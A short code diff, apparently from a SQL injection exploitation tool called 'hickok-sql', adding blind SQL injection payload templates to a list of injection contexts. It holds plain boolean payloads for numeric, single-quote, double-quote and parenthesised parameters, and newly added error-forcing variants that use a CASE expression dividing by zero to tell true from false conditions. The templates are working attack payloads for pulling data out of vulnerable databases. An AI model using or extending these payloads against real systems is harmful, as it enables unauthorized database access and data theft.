@@ -20,10 +20,15 @@ _UA = "hickok-sql/0.1"
 # Injection contexts: how to wrap an arbitrary boolean condition C around the
 # parameter's normal value V. The right one is found by calibration.
 _CONTEXTS = [
+    # Plain boolean — works when a false condition visibly changes the page.
     ("numeric",       "{v} AND ({c})-- -"),
     ("single-quote",  "{v}' AND ({c})-- -"),
     ("double-quote",  "{v}\" AND ({c})-- -"),
     ("paren-single",  "{v}') AND ({c})-- -"),
+    # Error-forcing — a false condition divides by zero, so even when the page
+    # barely changes on a false row, true (page) vs false (error) is night & day.
+    ("numeric/error", "{v} AND (CASE WHEN ({c}) THEN 1 ELSE 1/0 END)=1-- -"),
+    ("single/error",  "{v}' AND (CASE WHEN ({c}) THEN 1 ELSE 1/0 END)=1-- -"),
 ]
 
 # DBMS detection — a condition true only on that engine.
